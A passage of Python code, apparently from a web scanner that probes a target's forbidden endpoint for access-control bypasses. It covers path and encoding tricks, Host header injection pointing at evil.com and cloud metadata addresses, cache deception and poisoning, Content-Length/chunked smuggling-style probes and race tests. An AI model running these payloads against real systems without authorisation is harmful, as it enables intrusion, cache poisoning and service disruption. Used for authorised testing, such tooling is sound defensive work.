                if status not in [400, 401, 403, 429]:
                    is_confirmed_bypass = status in [200, 201, 202, 204]
                    severity = 'CRITICAL' if is_confirmed_bypass else 'LOW'
                    disc_type = 'Header Confusion Bypass' if is_confirmed_bypass else 'Header Confusion Discrepancy'
                    label = '[!] Bypass Confirmed' if is_confirmed_bypass else '[~] Discrepancy (not a bypass)'
                    self.discrepancies.append({
                        'type': disc_type,
                        'test_name': test['name'],
                        'forbidden_url': self.forbidden_endpoint,
                        'headers': test['headers'],
                        'response_code': status,
                        'severity': severity,
                        'is_confirmed_bypass': is_confirmed_bypass,
                        'evidence': f"Status changed from 403 to {status}"
                    })
                    print(f"    {label}: {test['name']} -> {status}")
                
                # Check for Information Leakage (different response body length)
                # (Note: self.baseline_forbidden_size should be defined during discovery)
                if hasattr(self, 'baseline_forbidden_size') and abs(content_len - self.baseline_forbidden_size) > 100:
                    self.discrepancies.append({
                        'type': 'Header Confusion Leak',
                        'test_name': test['name'],
                        'forbidden_url': self.forbidden_endpoint,
                        'response_code': status,
                        'severity': 'MEDIUM',
                        'evidence': f"Response length change: {content_len} vs {self.baseline_forbidden_size}"
                    })
                    print(f"    [?] Potential Leakage: {test['name']} (Length changed)")

            except Exception as e:
                # print(f"    [x] Test failed: {test['name']} ({str(e)})")
                pass
    
    def test_method_confusion(self):
        """Test HTTP method parsing discrepancies - EXPANDED"""
        print("  🔬 Testing Method Confusion...")

        # EXPANDED: Added WebDAV methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT', 'PROPFIND', 'MKCOL']
        results = {}
        
        for method in methods:
            try:
                response = self.session.request(method, self.forbidden_endpoint, timeout=5)
                results[method] = response.status_code
                
                # If any method bypasses forbidden
                if response.status_code not in [401, 403, 405, 429]:
                    body_len = len(response.content)

                    if method == 'OPTIONS' and response.status_code == 200:
                        # OPTIONS 200 is normal CORS/preflight behaviour: body is
                        # typically empty and the response only carries Allow/CORS
                        # headers.  Only flag as a real bypass when the body is large
                        # enough to indicate that actual protected content was returned.
                        is_confirmed_bypass = body_len > 200
                        discrepancy_type = 'Method Confusion - OPTIONS'
                        note = (
                            'OPTIONS returned 200 with a non-trivial body — verify manually'
                            if is_confirmed_bypass else
                            'OPTIONS 200 with empty/tiny body: normal preflight, not a bypass'
                        )
                    elif method == 'TRACE' and response.status_code == 200:
                        # TRACE echoes the request back; this is an XST (Cross-Site
                        # Tracing) risk but does NOT grant access to the protected
                        # resource, so it is not a 403 bypass.
                        is_confirmed_bypass = False
                        discrepancy_type = 'TRACE Enabled (XST risk)'
                        note = 'TRACE is enabled — Cross-Site Tracing risk; not a 403 bypass'
                    else:
                        is_confirmed_bypass = response.status_code in [200, 201, 202, 204]
                        discrepancy_type = 'Method Confusion'
                        note = None

                    entry = {
                        'type': discrepancy_type,
                        'method': method,
                        'forbidden_url': self.forbidden_endpoint,
                        'response_code': response.status_code,
                        'response_body_len': body_len,
                        'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                        'is_confirmed_bypass': is_confirmed_bypass,
                    }
                    if note:
                        entry['note'] = note
                    self.discrepancies.append(entry)

                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                    print(f"    {label}: {method} → {response.status_code}")
            except Exception as e:
                results[method] = f"Error: {str(e)}"
    
    def _fetch_homepage_fingerprint(self) -> Optional[Dict]:
        """
        Fetch the site root to build a fingerprint used for false-positive
        detection in path normalisation tests.

        Returns a dict with hashes and length, or None on failure.
        """
        try:
            parsed = urlparse(self.forbidden_endpoint or self.target_url)
            root_url = f"{parsed.scheme}://{parsed.netloc}/"
            resp = self.session.get(root_url, timeout=5, allow_redirects=True)
            body = resp.content
            stripped = re.sub(rb'\s+', b' ', body)
            return {
                'url': root_url,
                'status_code': resp.status_code,
                'content_length': len(body),
                'body_hash': hashlib.md5(body).hexdigest(),
                'body_hash_stripped': hashlib.md5(stripped).hexdigest(),
            }
        except Exception:
            return None

    def _is_homepage_response(self, response: requests.Response) -> bool:
        """
        Return True when the response looks like the site homepage.

        Used to filter path-normalisation false positives: variants such as
        '/admin/..' often get resolved to '/' by the server and return the
        homepage with HTTP 200 – that is NOT a real bypass.

        Matching strategy (any one is sufficient):
          1. Exact body MD5 match with the homepage.
          2. Whitespace-normalised body MD5 match.
          3. Content-length within 2 % of the homepage length (for dynamically
             generated pages that embed a timestamp or nonce).
        """
        if not self._homepage_fingerprint:
            return False

        body = response.content

        # 1. Exact hash
        if hashlib.md5(body).hexdigest() == self._homepage_fingerprint['body_hash']:
            return True

        # 2. Whitespace-normalised hash
        stripped_hash = hashlib.md5(re.sub(rb'\s+', b' ', body)).hexdigest()
        if stripped_hash == self._homepage_fingerprint['body_hash_stripped']:
            return True

        # 3. Length proximity (±2 %)
        hp_len = self._homepage_fingerprint['content_length']
        resp_len = len(body)
        if hp_len > 0 and abs(resp_len - hp_len) / hp_len <= 0.02:
            return True

        return False

    def test_path_normalization(self):
        """Test path parsing discrepancies - EXPANDED"""
        print("  🔬 Testing Path Normalization...")

        # Extract path from forbidden endpoint
        parsed = urlparse(self.forbidden_endpoint)
        base_path = parsed.path

        path_variants = [
            base_path,
            base_path + '/',
            base_path + '//',
            base_path + '/.',
            base_path + '/./',
            base_path + '/../' + base_path.split('/')[-1],
            base_path.upper(),
            base_path.replace('/', '//'),
            urllib.parse.quote(base_path),
            urllib.parse.quote(base_path, safe=''),
            base_path + '%00',
            base_path + '?',
            base_path + '#',
            # EXPANDED: New path variants
            base_path.replace('/', '\\'),  # Backslash (Windows style)
            '\ufeff' + base_path,  # UTF-8 BOM
            base_path + ';',  # Path parameter separator
            base_path.replace('/', '%2F'),  # Encoded slash
            base_path + '%0a',  # Newline injection
            base_path.replace('/', '/./'),  # Dot segments
            base_path + '/..',
            base_path + '/../',
            base_path + '/./..',
            base_path + '/././',
            base_path + '/..;/',
            base_path + '/.;/',
            base_path + '/./;/',
            base_path.replace('/', '/././'),
            base_path + ';',
            base_path + ';/',
            base_path + ';jsessionid=ABC',
            base_path.replace('/', ';jsessionid=ABC/'),
            base_path + ';v=1',
            base_path + ';anything',
            base_path.replace('/', '\\'),
            base_path.replace('/', '\\\\'),
            base_path.replace('/', '/\\'),
            base_path.replace('/', '\\/'),
            base_path + '/..\\',
            base_path + '\\..\\',
            base_path + '.',
            base_path + '..',
            base_path + '...',
            base_path + '....//',
            base_path + '::$DATA',
            base_path + '?/',
            base_path + '??',
            base_path + '?.',
            base_path + ';/',
            base_path + '#/',
            base_path + '%23/',
            base_path + '::$INDEX_ALLOCATION'
        ]
        
        for variant in path_variants:
            try:
                test_url = f"{parsed.scheme}://{parsed.netloc}{variant}"
                response = self.session.get(test_url, timeout=5, allow_redirects=False)

                if response.status_code not in [400, 401, 403, 404, 429]:
                    is_confirmed_bypass = response.status_code in [200, 201, 202, 204]

                    # False-positive guard: a 2xx that serves the homepage is NOT a
                    # bypass – the server simply normalised the path back to '/'.
                    if is_confirmed_bypass and self._is_homepage_response(response):
                        print(f"    ⚠️  False Positive (homepage served): {variant} → {response.status_code}")
                        continue

                    self.discrepancies.append({
                        'type': 'Path Normalization',
                        'original_path': base_path,
                        'variant': variant,
                        'test_url': test_url,
                        'response_code': response.status_code,
                        'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                        'is_confirmed_bypass': is_confirmed_bypass,
                    })
                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                    print(f"    {label}: {variant} → {response.status_code}")
            except Exception as e:
                pass
    
    def test_protocol_confusion(self):
        """Test protocol version confusion"""
        print("  🔬 Testing Protocol Confusion...")
        
        # HTTP/1.1 vs HTTP/1.0
        try:
            # Force HTTP/1.0
            import http.client
            parsed = urlparse(self.forbidden_endpoint)
            conn = http.client.HTTPConnection(parsed.netloc) if parsed.scheme == 'http' else http.client.HTTPSConnection(parsed.netloc)
            
            conn.request("GET", parsed.path or '/', headers={'Host': parsed.netloc})
            response = conn.getresponse()
            
            if response.status not in [403, 401]:
                is_confirmed_bypass = response.status in [200, 201, 202, 204]
                self.discrepancies.append({
                    'type': 'Protocol Confusion',
                    'test': 'HTTP/1.0 vs HTTP/1.1',
                    'forbidden_url': self.forbidden_endpoint,
                    'response_code': response.status,
                    'severity': 'MEDIUM' if is_confirmed_bypass else 'LOW',
                    'is_confirmed_bypass': is_confirmed_bypass,
                })
                label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                print(f"    {label}: HTTP/1.0 → {response.status}")
            
            conn.close()
        except Exception as e:
            pass
    
    def test_encoding_confusion(self):
        """Test encoding confusion between layers"""
        print("  🔬 Testing Encoding Confusion...")
        
        parsed = urlparse(self.forbidden_endpoint)
        base_path = parsed.path
        
        encoding_variants = [
            urllib.parse.quote(base_path),
            urllib.parse.quote(urllib.parse.quote(base_path)),  # Double encoding
            base_path.replace('/', '%2f'),
            base_path.replace('/', '%252f'),  # Double encoded slash
            base_path.replace(' ', '%20').replace('%20', '+'),
            base_path.replace('/', '%2f'),
            base_path.replace('/', '%252f'),
            base_path.replace('/', '%2F'),
            base_path.replace('/', '%255c'),
            base_path.replace('/', '/%2e%2e/'),
            base_path.replace('/', '/.%2e/'),
            base_path.replace('/', '/%2e./'),
            base_path.replace('/', '%5c'),
            base_path.replace('/', '%255c'),
            base_path.replace('/', '\u2215'),   # Division slash
            base_path.replace('/', '\u2044'),   # Fraction slash
            base_path.replace('/', '\uff0f'),   # Fullwidth slash
            '\u200b' + base_path,               # Zero-width space
            base_path + '\u200b',
            '\ufeff' + base_path,
            base_path.replace('/', '%ef%bc%8f'),
            base_path + '/%3f',
            base_path + '/%23',
            base64.b64encode(base_path.encode()).decode()
        ]
        
        for variant in encoding_variants:
            try:
                test_url = f"{parsed.scheme}://{parsed.netloc}{variant}"
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code not in [403, 401, 400, 429]:
                    is_confirmed_bypass = response.status_code in [200, 201, 202, 204]
                    self.discrepancies.append({
                        'type': 'Encoding Confusion',
                        'original_path': base_path,
                        'encoded_variant': variant,
                        'test_url': test_url,
                        'response_code': response.status_code,
                        'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                        'is_confirmed_bypass': is_confirmed_bypass,
                    })
                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                    print(f"    {label}: encoding → {response.status_code}")
            except Exception as e:
                pass

    def test_content_type_confusion(self):
        """Test Content-Type header discrepancies - NEW"""
        print("  🔬 Testing Content-Type Confusion...")

        content_type_tests = [
            {'Content-Type': 'text/plain'},
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {'Content-Type': 'multipart/form-data'},
            {'Content-Type': 'application/xml'},
            {'Content-Type': 'text/html'},
            {'Content-Type': 'application/octet-stream'},
            {'Content-Type': 'application/json; charset=utf-8'},
            {'Content-Type': 'application/json; charset=UTF-16'},
            {'Content-Type': 'text/plain; charset=UTF-7'},
            {'Content-Type': 'application/xml; charset=iso-8859-1'},
            {'Content-Type': 'text/html; charset=ascii'},
            {'Content-Type': 'application/json;boundary=foo'},
            {'Content-Type': 'Application/Json'},
            {'Content-Type': 'APPLICATION/JSON'},
            {'Content-Type': ' application/json'},
            {'Content-Type': 'application/json '},
            {'Content-Type': '\tapplication/json'},
            {'Content-Type': 'application/json\t'},
            {'Content-Type': 'application/json, text/plain'},
            {'Content-Type': 'text/plain, application/json'},
            {'Content-Type': 'application/json; text/plain'},
            {'Content-Type': 'application/javascript'},
            {'Content-Type': 'text/javascript'},
            {'Content-Type': 'application/x-json'},
            {'Content-Type': 'application/xml+soap'},
            {'Content-Type': 'application/soap+xml'},
            {'Content-Type': 'text/xml'},
            {'Content-Type': 'application/problem+json'},
            {'Content-Type': 'application/hal+json'},
            {'Content-Type': 'application/ld+json'},
            {'Content-Type': 'application/vnd.api+json'},
            {'Content-Type': 'application/vnd.github+json'},
            {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'},
            {'Content-Type': 'multipart/form-data; boundary=foo'},
            {'Content-Type': 'multipart/form-data; boundary='},
            {'Content-Type': ''},
            {'Content-Type': ' '},
            {'Content-Type': ';'},
            {'Content-Type': '/'},
            {'Content-Type': 'application'},
            {'Content-Type': 'application/'},
            {'Content-Type': 'application/json\n'},
            {'Content-Type': 'application/json\r\n'},
            {'Content-Type': 'text/plain', 'Accept': 'application/json'},
            {'Content-Type': 'application/json', 'Accept': '*/*'}
        ]

        for headers in content_type_tests:
            try:
                response = self.session.post(self.forbidden_endpoint, headers=headers, data='test', timeout=5)

                if response.status_code not in [403, 401, 405, 429]:
                    is_confirmed_bypass = response.status_code in [200, 201, 202, 204]
                    self.discrepancies.append({
                        'type': 'Content-Type Confusion',
                        'content_type': headers.get('Content-Type', ''),
                        'forbidden_url': self.forbidden_endpoint,
                        'response_code': response.status_code,
                        'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                        'is_confirmed_bypass': is_confirmed_bypass,
                    })
                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                    print(f"    {label}: {headers.get('Content-Type', '')} → {response.status_code}")
            except Exception as e:
                pass

    def test_host_header_attacks(self):
        """Test Host header manipulation - NEW"""
        print("  🔬 Testing Host Header Attacks...")

        parsed = urlparse(self.target_url)
        original_host = parsed.netloc

        host_variations = [
            {'Host': 'localhost'},
            {'Host': 'localhost.'},
            {'Host': '127.0.0.1'},
            {'Host': '127.0.0.1.'},
            {'Host': '[::1]'},
            {'Host': '0.0.0.0'},
            {'Host': f'{original_host}:80'},
            {'Host': f'{original_host}:443'},
            {'Host': f'{original_host}:8080'},
            {'Host': f'{original_host}:8443'},
            {'Host': f'{original_host}:'},
            {'Host': f'{original_host}:443@evil.com'},
            {'Host': f'{original_host}@evil.com'},
            {'Host': f'evil.com@{original_host}'},
            {'Host': f'{original_host}%40evil.com'},
            {'Host': f'{original_host}@127.0.0.1'},
            {'Host': f'{original_host}.'},
            {'Host': f'.{original_host}'},
            {'Host': f'www.{original_host}'},
            {'Host': f'{original_host}.evil.com'},
            {'Host': original_host.replace('a', 'а')},  # Cyrillic a
            {'Host': f'xn--{original_host}'},
            {'Host': original_host.upper()},
            {'Host': original_host.swapcase()},
            {'Host': f' {original_host}'},
            {'Host': f'{original_host} '},
            {'Host': f'\t{original_host}'},
            {'Host': 'evil.com'},
            {'Host': original_host, 'X-Forwarded-Host': 'evil.com'},
            {'Host': original_host, 'X-Forwarded-Host': 'localhost'},
            {'Host': original_host, 'X-Forwarded-Server': 'evil.com'},
            {'Host': original_host, 'X-Original-Host': 'evil.com'},
            {'Host': original_host, 'X-Host': 'evil.com'},
            {'Host': original_host, 'Forwarded': 'host=evil.com'},
            {'Host': original_host, 'Forwarded': 'for=127.0.0.1;host=evil.com'},
            {'Host': '[::ffff:127.0.0.1]'},
            {'Host': '[::ffff:7f00:1]'},
            {'Host': f'{original_host}\x00.evil.com'},
            {'Host': f'{original_host}%00.evil.com'},
            {'Host': '169.254.169.254'},
            {'Host': 'metadata.google.internal'}

        ]

        for headers in host_variations:
            try:
                response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)

                # 400 Bad Request  → server correctly rejected the malformed Host
                # 421 Misdirected Request → server correctly refused the wrong-host request
                # Both are expected security behaviour, not exploitable discrepancies.
                if response.status_code not in [400, 401, 403, 421, 429]:
                    self.discrepancies.append({
                        'type': 'Host Header Attack',
                        'headers': headers,
                        'forbidden_url': self.forbidden_endpoint,
                        'response_code': response.status_code,
                        'severity': 'CRITICAL' if response.status_code == 200 else 'HIGH'
                    })
                    print(f"    ✅ Discrepancy found: {headers} → {response.status_code}")
            except Exception as e:
                pass

    # Advanced Discrepancy Tests
    def test_parser_state_confusion(self):
        """Test parser state machine desynchronization"""
        print("  🔄 Testing Parser State Machine Confusion...")

        # HTTP/2 Pseudo-Header Injection
        try:
            headers = {
                ':method': 'GET',
                ':path': '/admin',
                ':authority': 'internal.backend',
                ':scheme': 'https',
                'x-override-method': 'POST'
            }

            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)

            if response.status_code != 400:  # Should fail with pseudo-headers in HTTP/1.1
                severity, cvss = self.calculate_severity('Parser State Confusion', response.status_code)
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'H2 Pseudo-Header Injection',
                    'description': 'HTTP/2 pseudo-headers accepted in HTTP/1.1 context',
                    'headers': headers,
                    'response_code': response.status_code,
                    'severity': severity,
                    'cvss_score': cvss
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", f"[{severity}] H2 pseudo-header confusion (CVSS: {cvss})")
        except:
            pass

        # WebSocket Upgrade State Confusion
        try:
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }

            response1 = self.session.get(self.forbidden_endpoint, headers=ws_headers, timeout=2)
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            response2 = self.session.get(test_endpoint, timeout=2)

            if response2.status_code == 200:
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'WebSocket State Leak',
                    'description': 'Parser state leaked between WebSocket and HTTP',
                    'evidence': 'Admin path accessible after WebSocket attempt'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "WebSocket state leak")
        except:
            pass

    def test_buffer_boundary_discrepancies(self):
        """Test buffer boundary confusion"""
        print("  📊 Testing Buffer Boundary Discrepancies...")

        # Header Buffer Boundary Test
        try:
            large_header_value = 'A' * 8192
            headers = {
                'X-Large-Header': large_header_value[:8000],
                'X-Secret': 'admin'
            }

            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)

            if response.status_code in [200, 413, 431]:
                discrepancy = {
                    'type': 'Buffer Boundary',
                    'subtype': 'Header Buffer Overflow',
                    'description': 'Headers at 8KB boundary processed differently',
                    'buffer_size': 8192,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Buffer Boundary", "8KB header boundary")
        except:
            pass

        # URL Length Boundary Test
        try:
            for size in [2048, 4096, 8192]:
                long_path = '/' + 'A' * (size - 20) + '/../admin'
                response = self.session.get(f"{self.target_url}{long_path}", timeout=5)

                if response.status_code != 414:
                    discrepancy = {
                        'type': 'Buffer Boundary',
                        'subtype': 'URL Length Limit',
                        'description': f'URL accepted at {size} bytes',
                        'buffer_size': size,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Buffer Boundary", f"{size} byte URL accepted")
        except:
            pass

    def test_nested_encoding_confusion(self):
        """Test nested encoding state stack confusion"""
        print("  🔢 Testing Nested Encoding Confusion...")

        # Mixed UTF-8 and UTF-16 BOM switching
        try:
            payload = b'\xef\xbb\xbf/admin\xff\xfe'
            response = self.session.get(
                self.forbidden_endpoint,
                data=payload,
                headers={'Content-Type': 'text/plain'},
                timeout=5
            )

            if response.status_code != 400:
                discrepancy = {
                    'type': 'Nested Encoding',
                    'subtype': 'BOM Switching',
                    'description': 'Mixed BOM encoding accepted',
                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Encoding", "BOM switching accepted")
        except:
            pass

        # Percent-Encoding in Different Bases
        encoding_variations = [
            ('Hex Standard', '/%61dmin'),
            ('Octal', '/%0141dmin'),
            ('Unicode IIS', '/%u0061dmin'),
            ('Double Decimal', '/%%36%31dmin'),
            ('Hex lower', '/%61dmin'),
            ('Hex upper', '/%41dmin'),
            ('Hex mixed', '/%4Admin'),
            ('Incomplete hex', '/%6dmin'),
            ('Invalid hex tolerated', '/%6Gdmin'),
            ('Double encoded hex', '/%2561dmin'),
            ('Triple encoded hex', '/%252561dmin'),
            ('Double slash', '/%252fadmin'),
            ('Double dot', '/%252e%252e/admin'),
            ('Hex + literal', '/%61d%6din'),
            ('Hex + slash', '/%61d%2fmin'),
            ('Hex + dot', '/%2e%2e%2fadmin'),
            ('Mixed case slash', '/%2Fadmin'),
            ('Unicode IIS', '/%u0061dmin'),
            ('Unicode uppercase', '/%U0061dmin'),
            ('Unicode slash', '/%u2215admin'),
            ('Unicode dot', '/%u002e%u002e%u2215admin'),
            ('Overlong UTF-8 slash', '/%c0%afadmin'),
            ('Overlong UTF-8 dot', '/%c0%ae%c0%ae%c0%afadmin'),
            ('UTF-16 encoded slash', '/%00%2fadmin'),
            ('UTF-16 encoded dot', '/%00%2e%00%2e%00%2fadmin'),
            ('Encoded slash', '/%2fadmin'),
            ('Double encoded slash', '/%252fadmin'),
            ('Mixed slash', '/%2f%2fadmin'),
            ('Backslash encoded', '/%5cadmin'),
            ('Double encoded backslash', '/%255cadmin'),
            ('Encoded dot', '/%2e/admin'),
            ('Encoded dot-dot', '/%2e%2e/admin'),
            ('Double encoded dot-dot', '/%252e%252e/admin'),
            ('Mixed dot', '/.%2e/admin'),
            ('Unicode fullwidth slash', '/%ef%bc%8fadmin'),
            ('Unicode division slash', '/%e2%88%95admin'),
            ('Unicode fraction slash', '/%e2%81%84admin'),
            ('Null byte', '/admin%00'),
            ('Encoded null', '/admin%2500'),
            ('Tab encoded', '/admin%09'),
            ('Newline encoded', '/admin%0a'),
            ('CRLF encoded', '/admin%0d%0a'),
            ('Encoded question mark', '/admin%3f'),
            ('Encoded hash', '/admin%23'),
            ('Encoded semicolon', '/admin%3b'),
            ('Decimal encoding', '/%97dmin'),
            ('Octal variant', '/%0141dmin'),
            ('Mixed octal/hex', '/%0141%64min')

        ]

        for name, path in encoding_variations:
            try:
                response = self.session.get(f"{self.forbidden_endpoint}{path}", timeout=5)
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'Nested Encoding',
                        'subtype': f'{name} Encoding',
                        'description': f'{name} encoding decoded to /admin',
                        'encoded_path': path,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{name} encoding accepted")
            except:
                pass

    def test_protocol_tunneling_discrepancies(self):
        """Test protocol nesting confusion"""
        print("  🔀 Testing Protocol Tunneling Discrepancies...")

        # HTTP in HTTP (Absolute URI)
        try:
            response = self.session.request(
                'GET',
                f"{self.forbidden_endpoint}",
                headers={
                    'Host': 'public.site',
                    'X-Original-URL': 'http://internal.backend/admin'
                },
                timeout=5
            )

            if 'admin' in response.text.lower() or response.status_code == 200:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Absolute URI Confusion',
                    'description': 'Internal URL accessible via header',
                    'technique': 'X-Original-URL header',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol Tunneling", "Absolute URI confusion")
        except:
            pass

        # Multiple Protocol Upgrades
        try:
            headers = {
                'Upgrade': 'websocket, h2c, spdy/3.1',
                'Connection': 'Upgrade'
            }

            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)

            if response.status_code not in [400, 426]:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Multiple Upgrade Confusion',
                    'description': 'Multiple protocol upgrades not rejected',
                    'protocols': 'websocket, h2c, spdy/3.1',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol", "Multiple upgrades accepted")
        except:
            pass

    def test_cache_key_confusion(self):
        """
        Comprehensive testing for cache key computation discrepancies, 
        Web Cache Deception, and CPDoS signatures.
        """
        print("  🔑 Testing Cache Key Confusion & Cache Deception...")
        base_host = self.target_url.split('//')[1].split('/')[0]

        # 1. Advanced Case & Extension Variations (Web Cache Deception / CPDoS)
        case_variations = [
            ('/ADMIN', base_host),
            ('/admin', base_host.upper()),
            ('/Admin', base_host.capitalize()),
            ('/admin/', base_host),
            ('/admin/.', base_host),
            ('/admin/..;/', base_host), # Path normalization confusion
            ('/admin.js', base_host),   # Static extension spoofing
            ('/admin.JS', base_host),   # Case variation on extension
            ('/admin.css', base_host),
            ('/admin%2f', base_host),   # Encoded slash
            ('/admin%00', base_host),   # Null byte injection
            ('/admin?%0d%0a', base_host) # CRLF in query
        ]

        responses = {}
        for path, host in case_variations:
            try:
                # Test both with and without the variation to check for cache hits/misses
                full_url = f"{self.target_url}{path}" if path.startswith('/') else f"{self.target_url}/{path}"
                response = self.session.get(
                    full_url,
                    headers={'Host': host},
                    timeout=5,
                    allow_redirects=False
                )
                key = f"{path} (Host: {host})"
                responses[key] = response.status_code
                
                # Check for Web Cache Deception (200 OK on sensitive path with static extension)
                if '.js' in path.lower() or '.css' in path.lower():
                    if response.status_code == 200:
                         self.log_discovery("WARNING", "Cache", f"Potential Web Cache Deception on {path}")
            except:
                pass

        if len(set(responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Case/Extension Sensitivity',
                'description': 'Cache treats path/host variations inconsistently',
                'responses': responses
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", f"Found {len(set(responses.values()))} unique status codes in case testing")

        # 2. Advanced Parameter & Separator Confusion (Cache Poisoning)
        param_variations = [
            '/?b=2&a=1',            # Order confusion
            '/?a=1&b=2',            # Standard
            '/?a=1&b=2&',           # Trailing separator
            '/?a=1;b=2',            # Semicolon separator (Akamai/others)
            '/?a=1&a=2',            # Parameter pollution (duplicate)
            '/?a=1#fragment',       # Fragment in key?
            '/?__proto__=1',        # Prototype pollution check
            '/?id=1\0',             # Null byte in query
            '/?cb=' + str(int(time.time())), # Cache buster test
            '/?a[]=1&a[]=2',        # Array notation
            '/??a=1',               # Double question mark
            '/?a=1&&b=2',           # Empty parameter
            '/?%20a=1',             # Encoded space in key
            '/?a=%201'              # Encoded space in value
        ]

        param_responses = {}
        for params in param_variations:
            try:
                # Detect if the cache ignores certain parameters
                response = self.session.get(f"{self.target_url}{params}", timeout=5, allow_redirects=False)
                param_responses[params] = response.status_code
            except:
                pass

        if len(set(param_responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Parameter/Separator Confusion',
                'description': 'Query parameter handling affects cache behavior',
                'variations': param_responses
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", "Parameter/Separator handling is inconsistent")

    def test_parser_backtracking_dos(self):
        """Test parser algorithmic complexity"""
        print("  ⏱️ Testing Parser Backtracking...")

        # Nested Parameter Parsing Complexity
        try:
            nested_params = []
            for i in range(5):
                for j in range(5):
                    for k in range(5):
                        nested_params.append(f'p[{i}][{j}][{k}]=v')

            complex_query = '&'.join(nested_params)

            start_time = time.time()
            response = self.session.get(
                f"{self.forbidden_endpoint}/?{complex_query}",
                timeout=10
            )
            elapsed = time.time() - start_time

            if elapsed > 2:
                discrepancy = {
                    'type': 'Parser Complexity',
                    'subtype': 'Nested Parameter DoS',
                    'description': 'Nested parameters cause slow parsing',
                    'processing_time': elapsed,
                    'complexity': 'O(n³)',
                    'param_count': len(nested_params)
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser DoS", f"Slow parsing: {elapsed:.2f}s")
        except:
            pass

    def test_integer_overflow_length(self):
        """Test integer overflow in length calculations"""
        print("  🔢 Testing Integer Overflow in Lengths...")

        overflow_values = [
            ('2^32', '4294967296'),
            ('2^31', '2147483648'),
            ('Negative', '-1'),
            ('Scientific', '1e3'),
            ('Hex', '0x100')
        ]

        for name, value in overflow_values:
            try:
                headers = {
                    'Content-Length': value,
                    'Transfer-Encoding': 'chunked'
                }

                response = self.session.post(
                    self.forbidden_endpoint,
                    headers=headers,
                    data=b'test',
                    timeout=5
                )

                if response.status_code not in [400, 411, 413]:
                    discrepancy = {
                        'type': 'Integer Overflow',
                        'subtype': f'{name} Content-Length',
                        'description': f'Non-standard length value accepted: {value}',
                        'length_value': value,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Integer", f"{name} length: {value}")
            except:
                pass

    def test_toctou_race_conditions(self):
        """Test Time-of-Check vs Time-of-Use race conditions"""
        print("  ⚡ Testing TOCTOU Race Conditions...")

        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
            return

        try:
            results = []
            test_endpoint = self.forbidden_endpoint or f"{self.target_url}/api/admin"

            def race_request(delay):
                time.sleep(delay)
                try:
                    resp = self.session.get(test_endpoint, timeout=3)
                    results.append((delay, resp.status_code))
                except:
                    results.append((delay, 'error'))

            threads = []
            for delay in [0, 0.001, 0.01, 0.05]:
                thread = threading.Thread(target=race_request, args=(delay,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            status_codes = [r[1] for r in results if r[1] != 'error']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'TOCTOU Race',
                    'subtype': 'Async Validation',
                    'description': 'Race condition in request validation',
                    'timing_results': results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TOCTOU", f"Race condition detected: {len(set(status_codes))} responses")
        except:
            pass

    def test_quic_http3_confusion(self):
        """Test QUIC/HTTP3 specific discrepancies"""
        print("  🚀 Testing QUIC/HTTP3 Confusion...")

        if self.protocols['http3']:
            try:
                headers = {
                    'Alt-Used': 'evil.com:443',
                    'Alt-Svc': 'h3-29=":443"; ma=86400'
                }

